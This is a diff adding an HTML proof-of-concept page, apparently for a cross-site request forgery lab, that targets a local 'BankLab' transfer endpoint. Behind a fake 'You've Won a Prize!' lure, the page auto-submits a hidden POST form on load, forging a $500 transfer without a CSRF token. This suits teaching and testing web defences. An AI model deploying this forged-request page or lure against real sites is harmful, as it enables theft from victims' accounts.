@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<!--
+  ============================================================
+  csrf_poc.html  –  INTENTIONALLY VULNERABLE: CSRF PoC
+  Flaw: transfer.php requires no CSRF token
+  Concept: A victim visiting this page (while logged in to
+           BankLab) will silently POST a transfer to their
+           account without their knowledge.
+  ============================================================
+-->
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>You've Won a Prize! 🎉</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@700;900&display=swap');
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body {
+    background: linear-gradient(135deg,#FF6B6B 0%,#FF8E53 50%,#CC2936 100%);
+    min-height:100vh; display:flex; align-items:center; justify-content:center;
+    font-family:'Nunito',sans-serif;
+  }
+  .box {
+    background:#fff; border-radius:28px; padding:50px 56px; text-align:center;
+    box-shadow:0 20px 60px rgba(0,0,0,0.25); max-width:460px; width:90%;
+  }
+  .emoji { font-size:72px; line-height:1; margin-bottom:20px; animation:bounce .8s infinite alternate; }
+  @keyframes bounce { from{transform:translateY(0);} to{transform:translateY(-12px);} }
+  h1 { font-size:32px; color:#1A1A2E; font-weight:900; margin-bottom:12px; }
+  p  { color:#555; font-size:16px; line-height:1.6; margin-bottom:24px; }
+  .btn-fake {
+    background:linear-gradient(135deg,#FF6B6B,#CC2936);
+    color:#fff; border:none; border-radius:14px;
+    padding:16px 40px; font-size:17px; font-weight:900;
+    cursor:pointer; box-shadow:0 8px 24px rgba(204,41,54,.35);
+    font-family:'Nunito',sans-serif; transition:transform .2s;
+  }
+  .btn-fake:hover { transform:translateY(-2px); }
+
+  /* ATTACKER CONSOLE */
+  .console {
+    margin-top:32px; background:#1A1E2E; border-radius:14px;
+    padding:18px 22px; text-align:left; border:2px solid #2D3450;
+    font-family:'Courier New',monospace; font-size:12.5px; color:#A8D8A8;
+  }
+  .console .c-y { color:#FFD166; font-weight:700; }
+  .console .c-r { color:#FF8888; }
+  .console .c-c { color:#74D7EC; }
+  .timer { font-size:13px; color:#FF8888; margin-top:8px; }
+
+  .warning-label {
+    display:inline-flex; align-items:center; gap:6px;
+    background:#FFF0F0; border:1.5px solid #FADADD;
+    color:#C0392B; border-radius:20px; padding:5px 14px;
+    font-size:12px; font-weight:700; margin-bottom:18px;
+  }
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="emoji">🎉</div>
+  <div class="warning-label">⚠️ CSRF Lab Demo — Malicious Page</div>
+  <h1>Congratulations! You've Won!</h1>
+  <p>Click the button below to collect your free $500 prize. Offer expires soon!</p>
+  <button class="btn-fake" onclick="triggerCSRF()">🎁 Claim My Prize!</button>
+
+  <!-- HIDDEN CSRF FORM: auto-submits on page load -->
+  <!-- Targeting transfer.php with no token required -->
+  <form id="csrfForm" action="http://localhost/bank-lab/transfer.php"
+        method="POST" style="display:none;">
+    <!-- These values are what the attacker wants to transfer -->
+    <input type="hidden" name="to_account" value="102"/>
+    <input type="hidden" name="amount"     value="500"/>
+    <input type="hidden" name="memo"       value="CSRF transfer — attacker controlled"/>
+    <!-- ⚠ No CSRF token field — server will happily accept this! -->
+  </form>
+
+  <div class="console">
+    <div><span class="c-y">ATTACKER CONSOLE</span></div>
+    <div style="margin-top:8px;">
+      Target: <span class="c-c">http://localhost/bank-lab/transfer.php</span>
+    </div>
+    <div>Method: <span class="c-r">POST (forged, no token)</span></div>
+    <div>Payload: to_account=102 &amp; amount=<span class="c-r">500</span></div>
+    <div>Victim: <span class="c-c">logged-in BankLab session</span></div>
+    <div style="margin-top:10px;">Status: <span id="csrfStatus" class="c-y">Waiting for click...</span></div>
+    <div class="timer" id="timer"></div>
+  </div>
+</div>
+
+<script>
+// Auto-submit on page load (silent CSRF demo)
+window.onload = function() {
+  // Silently submit after 2 seconds to simulate real CSRF
+  setTimeout(autoSubmit, 2000);
+};
+
+function autoSubmit() {
+  document.getElementById('csrfStatus').textContent = 'AUTO-SUBMITTING forged request...';
+  document.getElementById('csrfForm').submit();
+}
+
+function triggerCSRF() {
+  document.getElementById('csrfStatus').textContent = 'Submitting forged transfer...';
+  document.getElementById('csrfForm').submit();
+}
+</script>
+</body>
+</html>
